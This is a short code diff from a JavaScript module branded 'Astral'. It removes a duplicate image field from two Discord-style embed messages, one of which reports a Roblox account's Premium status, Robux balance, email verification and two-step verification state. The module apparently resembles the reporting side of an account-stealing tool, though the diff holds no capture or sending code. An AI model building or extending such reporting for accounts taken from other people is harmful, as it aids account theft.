@@ -378,7 +378,6 @@ export default {
             color: 0xffffff,
             fields: fields,
             thumbnail: { url: imageUrl },
-            image: { url: imageUrl },
             footer: { text: `Astral • ${new Date().toLocaleString()}` },
             timestamp: new Date().toISOString()
           };
@@ -419,7 +418,6 @@ export default {
               { name: 'Settings', value: `Premium: ${d.premium ? `${yes} (${d.premiumRobux || 0} ${robuxEmoji})` : `${no} (0 ${robuxEmoji})`}\nMail: ${d.mailVerified ? `${yes} (Verified)` : `${no} (Unverified)`}\n2SV: ${d.twoStep ? `${yes} (Enabled)` : `${no} (Disabled)`}`, inline: false }
             ],
             thumbnail: { url: imageUrl },
-            image: { url: imageUrl },
             footer: { text: `Astral • ${new Date().toLocaleString()}` },
             timestamp: new Date().toISOString()
           };
